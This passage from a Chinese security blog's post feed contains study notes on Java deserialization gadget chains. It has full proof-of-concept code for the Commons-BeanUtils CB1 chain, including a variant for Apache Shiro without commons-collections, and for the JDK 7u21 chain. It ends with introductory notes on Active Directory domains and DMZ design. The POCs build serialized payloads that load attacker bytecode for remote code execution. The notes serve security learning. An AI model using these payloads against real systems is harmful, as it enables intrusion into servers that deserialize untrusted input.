class="line">        a = <span class="string">&quot;234243&quot;</span>;</span><br><span class="line">         a = (String) PropertyUtils.getProperty(x , <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        System.out.println(a);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>可以直接通过<code>PropertyUtils.getProperty</code>方法调用<code>getName</code>方法。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220319104205.png"></p>
<h2 id="BeanComparator"><a href="#BeanComparator" class="headerlink" title="BeanComparator"></a>BeanComparator</h2><p><code>Apache commons-beanutils</code>含有一个类<code>BeanComparator</code>继承了<code>Comparator</code>接口。其中的的<code>compare</code>方法调用了<code>PropertyUtils.getProperty</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Object o1, Object o2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.property == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.comparator.compare(o1, o2);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object value1 = PropertyUtils.getProperty(o1, <span class="keyword">this</span>.property);</span><br><span class="line">            Object value2 = PropertyUtils.getProperty(o2, <span class="keyword">this</span>.property);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.comparator.compare(value1, value2);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;IllegalAccessException: &quot;</span> + var5.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;InvocationTargetException: &quot;</span> + var6.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;NoSuchMethodException: &quot;</span> + var7.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>巧合的是之前的<code>TemplatesImpl</code>类的调用链最前面两条其中一条就是以<code>get</code>开头。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt;</span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()</span><br><span class="line">-&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>
<p>我们可以通过<code>cmpare</code>方法进而调用<code>getOutputProperties</code>方法来达到<code>RCE</code>.</p>
<p>POC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cb1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> common.Common;</span><br><span class="line"><span class="keyword">import</span> evil.Test;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CB1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception</span>&#123;</span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        CtClass clazz = classPool.get(evil.Evil.class.getName());</span><br><span class="line">        <span class="keyword">byte</span>[] code = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Common.setFieldValue(templates , <span class="string">&quot;_name&quot;</span> , <span class="string">&quot;fsfssdf&quot;</span>);</span><br><span class="line">        Common.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125; );</span><br><span class="line">        Common.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        BeanComparator cmp = <span class="keyword">new</span> BeanComparator();</span><br><span class="line"><span class="comment">//        PriorityQueue queue = new PriorityQueue&lt;Object&gt;(2, cmp);</span></span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(cmp);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line">        Common.setFieldValue(cmp, <span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span> );</span><br><span class="line">        Common.setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> Object[] &#123;templates, templates&#125; );</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Shiro-CB1"><a href="#Shiro-CB1" class="headerlink" title="Shiro CB1"></a>Shiro CB1</h2><p>在Shiro中我们需要<code>commons-collections</code>才可以通过CC链实现反序列化的攻击。但是<code>commons-collections</code>毕竟是一个外部组件，并不是必须品。所以如果目标Shiro不使用<code>commons-collections</code>要如何进行反序列化攻击。把ShrioDemo项目pom.xml中的<code>commons-collections</code>去除。可以发现外部依赖库仍然有<code>commons-beanutils</code>。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220319111740.png"></p>
<p>可以试试如果使用<code>CB1</code>是否可以做到反序列化攻击。<br>但是Tomcat报错，显示找不到<code>org.apache.commons.collections.comparators.ComparableComparator</code>。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220319115642.png"></p>
<p>当我们在创建<code>BeanComparator</code>时如果不指定<code>comparator</code>。这<code>BeanComparator</code>会使用<code>ComparableComparator</code>作为默认<code>comparator</code>。它又依赖于<code>commons-collections</code>库。<br>可以找到一个类即实现了<code>comparator</code>又拥有<code>serilize</code>接口.这个类是<code>String.CASE_INSENSITIVE_ORDER</code>。</p>
<p>用修该后的POC可以实现弹出计算器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cb1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> common.Common;</span><br><span class="line"><span class="keyword">import</span> evil.Test;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CB1</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] main(String[] args) <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        CtClass clazz = classPool.get(evil.Evil.class.getName());</span><br><span class="line">        <span class="keyword">byte</span>[] code = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Common.setFieldValue(templates , <span class="string">&quot;_name&quot;</span> , <span class="string">&quot;fsfssdf&quot;</span>);</span><br><span class="line">        Common.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125; );</span><br><span class="line">        Common.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        BeanComparator cmp = <span class="keyword">new</span> BeanComparator(<span class="keyword">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line"><span class="comment">//        BeanComparator cmp = new BeanComparator();</span></span><br><span class="line"><span class="comment">//        PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, cmp);</span></span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(cmp);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        Common.setFieldValue(cmp, <span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span> );</span><br><span class="line">        Common.setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> Object[] &#123;templates, templates&#125; );</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="keyword">return</span> barr.toByteArray();</span><br><span class="line"></span><br><span class="line"><span class="comment">//        System.out.println(barr);</span></span><br><span class="line"><span class="comment">//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span></span><br><span class="line"><span class="comment">//        ois.readObject();</span></span><br><span class="line"><span class="comment">//        ois.close();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>Shiro</tag>
        <tag>CB1</tag>
      </tags>
  </entry>
  <entry>
    <title>java漫谈笔记-7u21</title>
    <url>/2022/03/19/java%E6%BC%AB%E8%B0%88%E7%AC%94%E8%AE%B0-7u21/</url>
    <content><![CDATA[<h1 id="java漫谈笔记-7u21"><a href="#java漫谈笔记-7u21" class="headerlink" title="java漫谈笔记-7u21"></a>java漫谈笔记-7u21</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>文章为phith0n<a href="https://govuln.com/">【代码审计】知识星球</a>中JAVA安全漫谈部分部分内容摘抄与阅读笔记。</p>
<h2 id="7U21"><a href="#7U21" class="headerlink" title="7U21"></a>7U21</h2><p>7U21这条链不需要安装<code>Common-Collections</code>使用java的原生环境既可以达到反序列化的效果。<span id="more"></span>这条链调用的核型在于<code>AnnotaionInvocationHandler</code>中的<code>equalsImpl</code>方法。这个方法传入参数<code>o</code>。关键点在于<code>memberMethod.invoke(o)</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220319193812.png"><br>而<code>memberMethod</code>通过<code>getMemmberMethods</code>进而调用<code>computeMemberMethods</code>中的<code>getDeclaredMethods</code>方法获得当前<code>Handler.type</code>中的所有方法。如果<code>type</code>为<code>TemplatesImpl</code>且传入参数<code>o</code>为<code>TemplatesImpl</code>既可以调用<code>newTransformer()</code>达到RCE. </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220319194124.png">  </p>
<h3 id="调用equalsImpl"><a href="#调用equalsImpl" class="headerlink" title="调用equalsImpl"></a>调用<code>equalsImpl</code></h3><p><code>equlasImpl</code>方法在<code>Handler</code>中的<code>Invoke</code>方法中使用。当对代理使用的方法为<code>equals</code>且参数只有一个时，就会进入<code>equlas</code>在CC1中我们使用<code>Proxy</code>来进入<code>Invoke</code>方法。</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220319214435.png">现在我们需要找到一个方法使用<code>.equals(TemplatesImpl)</code>方法。</p>
<h3 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h3><p>在HashSet的<code>readObejct</code>方法中创建了<code>HashMap</code>使用<code>Put</code>方法。而在<code>Put</code>方法中我们存在<code>key.equals(obj)</code>方法。</p>
<p>如果要使用该方法，就不能被之前的<code>&amp;&amp;</code>和<code>||</code>短路。需要<code>Proxy.hashCode==TemplatesImpl.hashCode</code>，在反序列化的过程中，我们需要执行不同的命令，<code>TemplatesImpl</code>相当于一直在改变。从<code>TemplatesImpl</code>入手不现实，我们从<code>Proxy</code>入手。</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220319214919.png"></p>
<h3 id="hashCodeImpl"><a href="#hashCodeImpl" class="headerlink" title="hashCodeImpl"></a><code>hashCodeImpl</code></h3><p>对<code>Proxy</code>进行<code>hashCode</code>方法就会进入代理的<code>Invoke</code>方法。在<code>Invoke</code>方法中如果传递的方法名为<code>hashCode</code>就会进入<code>hashCodeImpl</code>方法。</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220319215815.png"></p>
<p>在<code>hashCodeImpl</code>方法中, 得到的<code>Hash值</code>为 <code>Map.key.hashCode * 127 ^ memberValueHashcode(Map.value) </code>。</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220319220028.png"></p>
<p>我们继续进入<code>memberValueHashCode</code>方法发现如果传递的参数如果不是数组，那么就会直接返回<code>obj.hashCode</code></p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220319220128.png"></p>
<p>也就是说<code>hashCodeImpl</code>返回的<code>Hash值</code>可以简化为<code>Map.key.hashCOde * 127 ^ Map.value.hashCode</code></p>
<p>这个时候如果<code>key</code>的<code>hashCode</code>值为0,那么返回值直接就为<code>Map.value.hashCOde</code>。也就是说如果我们传递<code>value</code>值为与<code>Proxy</code>比较<code>Hash值</code>的<code>TemplatesImpl</code>那么<code>Proxy</code>和<code>TemplatesImpl</code>的<code>Hash值</code>就相同了。可以用程序跑出来字符串<code>f5a5a608</code>的<code>hash值</code>为0.这就可以写POC了</p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> u21;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> common.Common;</span><br><span class="line"><span class="keyword">import</span> evil.Evil;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">U21</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Common.setFieldValue(obj , <span class="string">&quot;_name&quot;</span> , <span class="string">&quot;sadfas&quot;</span>);</span><br><span class="line">        Common.setFieldValue(obj  , <span class="string">&quot;_bytecodes&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;ClassPool.getDefault().get(evil.Evil.class.getName()).toBytecode()&#125;);</span><br><span class="line">        Common.setFieldValue(obj , <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        String zeroHashstr =  <span class="string">&quot;f5a5a608&quot;</span>;</span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(zeroHashstr, <span class="string">&quot;xyz&quot;</span>);</span><br><span class="line">        Constructor annotaionConsturct = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotaionConsturct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler temhandler= (InvocationHandler) annotaionConsturct.newInstance(Templates.class , map);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//为temhandler创建代理</span></span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(U21.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Templates.class&#125;, temhandler);</span><br><span class="line">        HashSet set = <span class="keyword">new</span> LinkedHashSet();</span><br><span class="line">        set.add(obj);</span><br><span class="line">        set.add(proxy);</span><br><span class="line"></span><br><span class="line">        map.put(zeroHashstr, obj );</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(set);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>流程图</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220319221746.png"></p>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>7u21</tag>
      </tags>
  </entry>
  <entry>
    <title>内网安全攻防笔记1</title>
    <url>/2022/04/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B01/</url>
    <content><![CDATA[<h1 id="内网攻防安全笔记1-1"><a href="#内网攻防安全笔记1-1" class="headerlink" title="内网攻防安全笔记1.1"></a>内网攻防安全笔记1.1</h1><h2 id="内网基础知识"><a href="#内网基础知识" class="headerlink" title="内网基础知识"></a>内网基础知识</h2><h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><p>在计算机属性选项，更改设置中更改计算机工作组名称。重启计算机后计算级会自动加入当前工作组。在工作组中所有计算机是平等的，可以互相访问对方共享的资源。工作组是相对自由的可以随意进入和退出。</p>
<span id="more"></span>

<h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>域可以理解为一个升级版的工作组，它具有更好地安全性，也更加易于管理。两个域之间无法互相访问，在域中的计算机如果想要获得域内的资源也需要使用合法的身份登录域，获取资源的数量也取决于登录身份的权利。</p>
<h3 id="域控制器-DC"><a href="#域控制器-DC" class="headerlink" title="域控制器 / DC"></a>域控制器 / DC</h3><p>域控制器/DC，简称为域控。域控相当于这个域的门禁，域中的计算机密码和帐号相关的信息都储存在DC中。一个计算机登录域，首先需要经过域的验证。DC会检验这台计算机是否在域中存在，然后检验用户名与密码是否正确。当着三项都满足时，计算机才可以登录到域中。</p>
<h3 id="域中环境"><a href="#域中环境" class="headerlink" title="域中环境"></a>域中环境</h3><h4 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h4><p>在小型公司中一 个域一般就可以满足需求。但是在一个域中一般需要两个DC。一个主DC一个备份DC,当主DC无法使用时，可以使用备份DC。不至于整个公司无法登录。</p>
<h4 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h4><p>有时一个公司的各个分公司分散在不同的地点，这个时候需要使用子域。使用子域可以减低带宽的负担，在同一个域中信息交互需要占用大量的带宽且不可以压缩。但是在不同的域中交换的信息很少而且可以压缩。另一个需要使用子域的场景是需要使用不同的安全策略，比如财务部需要单独定制策略，就可以将财务部单独划一个域。</p>
<h4 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h4><p>域树是多个域建立信任关系的集合。一个域管理员只能管理本域，如果需要访问其他域，域之间需要建立信任关系。父域和子域的关系类似于域名，子域名只能以父域为前缀。如<code>son.father.com</code>是<code>father.com</code>的子域。以一个父节点作为根节点的树即为域树。</p>
<h4 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h4><p>域森林是指多颗域树建立信任关系的集合。当一个公司收购另外一个公司，那个两个公司的域树的根节点不同，无法合并为一颗域树。如<code>abc.com</code>和<code>abc.net</code>这个时候可以在两颗树之间建立信任关系。可以保留两颗域树本身的结构不被破坏。</p>
<h4 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h4><p>可以发现域的关系和网络中域名的关系非常类似。同样在域中也可以使用域名服务器来进行域名和Ip的转换。一般在内网渗透中都是通过寻找DNS服务器位置来确认DC的位置。(一般DC和DNS配置在同一台主机上）</p>
<h4 id="活动目录-AD"><a href="#活动目录-AD" class="headerlink" title="活动目录(AD)"></a>活动目录(AD)</h4><p>活动目录(Active Dirctory  ,AD )域环境中提供目录服务的组件。<br>AD相当于域中的目录，通过这个目录可以直接管理域中的对象，而不需要到具体的主机信息信息进行管理。域树中的所有域共享一个活动目录，活动目录中的数据分散在各个域中，且各个域都只有该域的数据。<br>活动目录可以提供一下功能:</p>
<ul>
<li>帐号集中管理：所有帐号都储存在AD中，可以方便的进行管理</li>
<li>软件集中管理: 可以同一推送软件</li>
<li>环境集中管理: 同一客户机桌面， IE, TCP/IP协议设置</li>
<li>增强安全性: 同一部署安全杀毒软件，集中管理用户权限、用户密码</li>
<li>更可靠，更短的设置时间:</li>
</ul>
<h4 id="DC和AD区别"><a href="#DC和AD区别" class="headerlink" title="DC和AD区别"></a>DC和AD区别</h4><p>域中的许多机器，打印机，以及对象如；用户，用户组，共享文件的检索信息整理好，形成一个数据库，便于查找和管理。这个数据库就是AD库。<br>当一台机器安装AD后该机器遍拥有了AD库，同时该台机器就变为了DC。</p>
<h4 id="安全域的划分"><a href="#安全域的划分" class="headerlink" title="安全域的划分"></a>安全域的划分</h4><p>划分安全域就是将安全等级相同的计算机划分到同一个网段中。这个网段中的机器拥有相同的对内和对外的网络策略，以便将网络风险最小化。一个经典的划分如下<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220410225556.png">  </p>
<p>分为三个区域从高到底分别为 内网， DMZ ， 外网。<br>DMZ是隔离区，为了解决外部网络无法访问内部网络而建立的一个在安全区域和非安全区域的一个缓冲区。DMZ中安防企业必须提供的对外服务器如: Web服务器， FTP服务器，论坛服务器。如果攻击者打穿了外部网络，还需要攻破DMZ才可以访问到企业内网。<br>DMZ一般需要如下策略以保证安全性:</p>
<pre><code>- 内网可以访问外网:  防火墙执行NAT实现内网访问外网
- 内网可以访问DMZ:  内网用户可以管理DMZ中设置
- 外网用户无法访问内网: 外网用户不允许访问公司内部内网信息，如果必须访问需要在外网通过VPN访问内网。
- 外网可以访问DMZ:DMZ需要对外网提供服务，需要外网用户访问DMZ，同时这也需要防火墙实现网络地址到实际地址的转换。
- DMZ不允许访问内网: 为了保证内网安全，攻击者击穿DMZ时需要穿过防火墙限制才能访问内网
- DMZ 不允许访问外网：DMZ只需要提供服务，一般不需要主动访问外网信息。
</code></pre>
<p>内网也可以分为办公区和核心区:</p>
<ul>
<li>办公区:公司员工日常的工作区，一般可以访问DMZ。</li>
<li>核心区:存放企业重要数据的区域。一般有最严格的防护，只有很少的主机可以访问。</li>
</ul>
<h3 id="域中计算机分类"><a href="#域中计算机分类" class="headerlink" title="域中计算机分类"></a>域中计算机分类</h3><h4 id="域控-DC"><a href="#域控-DC" class="headerlink" title="域控(DC)"></a>域控(DC)</h4><p>DC用于管理所有域中计算机登录等相关信息。在网络中可以有多台计算机成为DC，共同工作以减小域中的压力，同时保证服务器稳定。</p>
<h4 id="成员服务器"><a href="#成员服务器" class="headerlink" title="成员服务器"></a>成员服务器</h4><p>安装了服务器系统并加入了域的计算机。成员服务器并没有安装AD,但是安装了其他服务器以提供网络资源。常见的成员服务器有:文件服务器， 应用服务器， 数据库服务器， Web服务器，邮件服务器，防火墙，打印服务器等。</p>
<h4 id="客户机"><a href="#客户机" class="headerlink" title="客户机"></a>客户机</h4><p>域中安装了其他操作系统的客户机。通过DC的安全验证后即可登录域，访问域中的各种资源。</p>
<h4 id="独立服务器"><a href="#独立服务器" class="headerlink" title="独立服务器"></a>独立服务器</h4><p>独立服务器和域没有关系。一台服务器不加入域，也不安装AD既是独立服务器。独立服务器可以创建工作组、与网络中的其他计算机共享资源，但是无法访问域中的资源。</p>
<h3 id="域中权限"><a href="#域中权限" class="headerlink" title="域中权限"></a>域中权限</h3><h4 id="组"><a href="#组" class="headerlink" title="组"></a>组</h4><p>组是用户帐号的集合。通过向组配置权限就可以使组中的所有成员拥有相同权限。通过配置组策略可以方便进行权限管理</p>
<h4 id="域本地组"><a href="#域本地组" class="headerlink" title="域本地组"></a>域本地组</h4><p>域本地组的帐号可以从其他域中添加帐号到组中，但是只可以配置当前所在域中的权限。域本地组不可以嵌套在其他组中。</p>
<h4 id="全局组"><a href="#全局组" class="headerlink" title="全局组"></a>全局组</h4><p>单域用户如果想要访问其他域的资源。需要在全局组中添加该用户。全局组可以在域林中配置权限。全局组可以 嵌套在其他组中。<br>例如: 将用户xyz添加在全局组<code>Domain Admins</code>中用户xyz这时成为域管理员。</p>
<h4 id="通用组"><a href="#通用组" class="headerlink" title="通用组"></a>通用组</h4><p>通用组的成员来自于森林中任何域的用户。可以在森林中配置权限，也可以进行嵌套。但是通用组的信息不是保存在DC上而是保存在全局编录(GC)中，通用组的改变都会导致林复制。</p>
<p>简单来说，域本地组来自于全林，作用于本域；全局组来自于本域，作用域全林；通用组来自于全林，作用于全林。</p>
<h4 id="A-G-DL-P策略"><a href="#A-G-DL-P策略" class="headerlink" title="A-G-DL-P策略"></a>A-G-DL-P策略</h4><p>A-G-DL-P策略是指：将用户账户加入全局组中，将全局组添加到本地组中，然后为本地组配置权限</p>
<ul>
<li>A :用户帐号(Account)</li>
<li>G:全局组(Global Group)</li>
<li>DL:域本地组(Domain Local Group)</li>
<li>P:资源权限(Permission)</li>
</ul>
<p>在A-G-DL-P策略中，如果需要为用户添加权限，只需要将用户添加到相应的本地组即可。</p>
<h4 id="系统默认本地组"><a href="#系统默认本地组" class="headerlink" title="系统默认本地组"></a>系统默认本地组</h4><ul>
<li>管理员组(Administrators)的成员可以不受限制的获取计算机/ 域的资源。在AD和DC中具有默认管理权限。该组成员可以更改<code>Enterprise Admin</code>, <code>Schema Admins</code>, <code>Domain Admins</code>组的成员关系</li>
<li>远程登录组(Remote Desktop Users)的成员具有远程登录权限</li>
<li>打印机操作组(Print Operator)的成员可以管理网络打印机，并可以在本地登录和关闭DC</li>
